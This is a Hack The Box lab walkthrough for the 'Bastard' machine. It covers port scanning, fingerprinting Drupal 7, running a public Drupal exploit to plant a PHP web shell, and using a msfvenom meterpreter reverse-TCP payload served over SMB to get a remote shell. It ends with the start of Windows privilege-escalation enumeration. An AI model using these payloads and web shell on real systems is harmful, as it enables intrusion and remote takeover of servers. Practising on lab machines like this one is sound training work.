# Bastard - Hack The Box Walkthrough

**Target IP**: `10.10.10.9`  
**Hostname**: `bastard.htb`  

---

## Initial Setup

### Preparing the Environment
1. Store the target IP in a file for reuse:
   ```bash
   echo 10.10.10.9 > target
   ```
2. Add the target to your `/etc/hosts` file for easier navigation:
   ```
   10.10.10.9   bastard.htb
   ```

---

## Enumeration

### Full Port Scan
I conducted a full TCP port scan to identify open ports:
```bash
nmap -p- -v -iL target -oN nmap/full_tcp_scan.txt
```

**Open Ports**:
- 80/tcp -
- 135/tcp - MSRPC
- 49154/tcp - MSRPC

```bash
nmap -p80,135,49154 -A -v -iL target -oN nmap/target_ports.txt
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Bastard | Bastard
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-server-header: Microsoft-IIS/7.5
|_http-generator: Drupal 7 (http://drupal.org)
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

### Port 80

The port 80 show me a Drupal login.
You can read the version on nmap or also runngin the command:

```bash
curl -s http://bastard.htb/CHANGELOG.txt | grep -m2 ""
```

Here you can read the CHANGELOG: http://bastard.htb/CHANGELOG.txt .
Here you can read the README: http://bastard.htb/README.txt .

![image](https://github.com/user-attachments/assets/bd363a40-deab-47b1-95dc-5a3b75cb61f9)

Then I looking for known vulnerabilities:

```bash
searchsploit Drupal 7
```

I try to run several payload the only one that I successfully run was `php/webapps/41564.php`:

![Screenshot from 2025-01-11 11-03-56](https://github.com/user-attachments/assets/3ed8366f-41cc-4cbd-ac4b-5376087bf787)

I copied it locally by running:

```bash
searchsploit -m php/webapps/41564.php
```

There are some settings to change:

* url
* rest endpoint
* command to execute

![Screenshot from 2025-01-11 10-33-25](https://github.com/user-attachments/assets/645bf428-9c10-4d64-8a62-cdc6be4cef3a)

The url we already known, we need to find out the rest endpoint, to achive it I run `ffuf` command to enumerate directories:

```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-u "http://bastard.htb/FUZZ"
```

I discover the `rest` folder and I test it with curl:

![Screenshot from 2025-01-11 11-10-34](https://github.com/user-attachments/assets/56c6d8c5-7f7d-411f-b419-0b892aa08c47)

Then I change the file settings:

```php
$url = 'http://bastard.htb';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
	'filename' => 'spread.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
```

![Screenshot from 2025-01-11 10-37-37](https://github.com/user-attachments/assets/89926a8b-7320-47d5-bd45-3b53a3cf250a)

To run the payload:

```bash
php 41564.php
```

But I got an error:

![Screenshot from 2025-01-11 10-38-24](https://github.com/user-attachments/assets/c26142ad-52cc-4772-9a6a-69480efc13de)

To fix it install the `php-curl` packet:

```bash
apt install php-curl
```

Then I run it again, it will create a new file:

![Screenshot from 2025-01-11 10-43-43](https://github.com/user-attachments/assets/6b036c20-f4bd-490f-ad60-1aab8978ed82)

You can test it by running:

```bash
curl "http://bastard.htb/spread.php?cmd=whoami"
```

![Screenshot from 2025-01-11 11-15-45](https://github.com/user-attachments/assets/87e6255d-b785-40bd-8a5a-73851cca01f4)

With msfvenom I generated an executable:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=8887 -f exe -o shell.exe
```

I started an smbclient:

```bash
impacket-smbserver -ip <IP> shares .
```

With msfconsole I started a handler:

```bash
use exploit/multi/handler
set LHOST <IP>
set LPORT 8887
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

And then I run, with curl, the executable:

```bash
curl "http://bastard.htb/spread.php?cmd=cmd.exe%20%2Fc%20%22%5C%5C<IP>%5Cshares%5Cshell.exe%22"
```

In the user directory I found the flag.

## Privile Escalation

Syteminformation:

```
systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          18/1/2025, 2:52:09 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.596 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.619 MB
Virtual Memory: In Use:    476 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

Listing the privileges I notice the Impersonation one:

```
C:\inetpub\drupal-7.54>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

Listing groups:

```
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
```

Listing users:

```
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            dimitris                 Guest                    
The command completed with one or more errors.
```



